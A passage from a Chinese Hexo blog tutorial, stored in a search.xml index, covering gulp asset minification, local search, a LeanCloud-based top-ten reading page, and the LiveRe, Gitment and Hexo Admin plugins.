gulp --save 在博客根目录下新建 gulpfile.js ，并填入以下内容： 123456789101112131415161718192021222324252627282930313233var gulp = require('gulp');var minifycss = require('gulp-minify-css');var uglify = require('gulp-uglify');var htmlmin = require('gulp-htmlmin');var htmlclean = require('gulp-htmlclean');// 压缩 public 目录 cssgulp.task('minify-css', function() &#123; return gulp.src('./public/**/*.css') .pipe(minifycss()) .pipe(gulp.dest('./public'));&#125;);// 压缩 public 目录 htmlgulp.task('minify-html', function() &#123; return gulp.src('./public/**/*.html') .pipe(htmlclean()) .pipe(htmlmin(&#123; removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, &#125;)) .pipe(gulp.dest('./public'))&#125;);// 压缩 public/js 目录 jsgulp.task('minify-js', function() &#123; return gulp.src('./public/**/*.js') .pipe(uglify()) .pipe(gulp.dest('./public'));&#125;);// 执行 gulp 命令时执行的任务gulp.task('default', [ 'minify-html','minify-css','minify-js']); 生成博文是执行 hexo g &amp;&amp; gulp 就会根据 gulpfile.js 中的配置，对 public 目录中的静态资源文件进行压缩。 搜索功能 安装 hexo-generator-searchdb，在站点的根目录下执行以下命令: 1npm install hexo-generator-searchdb --save 编辑 站点配置文件，新增以下内容到任意位置： 12345search: path: search.xml field: post format: html limit: 10000 编辑 主题配置文件，启用本地搜索功能： 123# Local searchlocal_search: enable: true 增加阅读排行统计页面首先我们可以使用leancloud来统计页面阅读数量，以及储存这些信息，然后通过leancloud提供的api编写js脚本来获取阅读数量信息，并展示在页面上。首先新建一个page页面，hexo new page “topten”,然后编辑此.md文件，写下：12345678910111213141516171819202122232425&lt;div id="Top10"&gt;&lt;/div&gt;&lt;script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"&gt;&lt;/script&gt;&lt;script&gt;AV.initialize("", ""); //需要写上leancloud的key&lt;/script&gt;&lt;script type="text/javascript"&gt; var time=0 var title="" var url="" var query = new AV.Query('Counter');//表名 query.notEqualTo('id',0); //id不为0的结果 query.descending('time'); //结果按阅读次数降序排序 query.limit(20); //最终只返回10条结果 query.find().then(function (todo) &#123; for (var i=0;i&lt;10;i++)&#123; var result=todo[i].attributes; time=result.time; //阅读次数 title=result.title; //文章标题 url=result.url; //文章url var content="&lt;p&gt;"+"&lt;font color='#0477ab'&gt;"+"【阅读次数:"+time+"】"+"&lt;a href='"+"http://thief.one"+url+"'&gt;"+title+"&lt;/font&gt;"+"&lt;/a&gt;"+"&lt;/p&gt;"; // document.write("&lt;a href='"+"http://thief.one/"+url+"'&gt;"+title+"&lt;/a&gt;"+" Readtimes:"+time+"&lt;br&gt;"); document.getElementById("Top10").innerHTML+=content &#125; &#125;, function (error) &#123; console.log("error"); &#125;);&lt;/script&gt; 添加 来必力 评论系统 (本站并不使用此功能)登录 来必力 获取你的 LiveRe UID。 编辑 主题配置文件， 编辑 livere_uid 字段，设置如下：1livere_uid: #your livere_uid 使用 Gitment 做评论系统 (本站所使用)在来必力的使用期间,发现这玩意有点卡卡的,emmm…可能是我自己的问题吧,总之我更换了个人认为更为方便的 gitment 。 Gitment 简介Gitment 是作者实现的一款基于 GitHub Issues 的评论系统。支持在前端直接引入，不需要任何后端代码。可以在页面进行登录、查看、评论、点赞等操作，同时有完整的 Markdown / GFM 和代码高亮支持。尤为适合各种基于 GitHub Pages 的静态博客或项目页面。 项目地址: gitment Demo Page: Demo 使用方法1.注册 OAuth Application点击此处 来注册一个新的 OAuth Application。其他内容可以随意填写，但要确保填入正确的 callback URL（一般是评论页面对应的域名，如 https://eibitme.github.io）。 2.修改 主题配置文件 gitment 配置以下几项123456gitment: enable: true github_user: *Your Github ID* github_repo: *The repo you use to store Gitment comments* client_id: *Github client id for the Gitment* client_secret: *Github access secret token for the Gitment* 使用 Hexo Admin 编辑 markdown 文章项目地址: Hexo Admin Demo: Hexo Admin Demo Quickstart:123npm install --save hexo-adminhexo server -dopen http://localhost:4000/admin/ 参考文章https://thief.one/2017/03/03/Hexo搭建博客教程/]]></content>
      <categories>
        <category>技术研究笔记</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
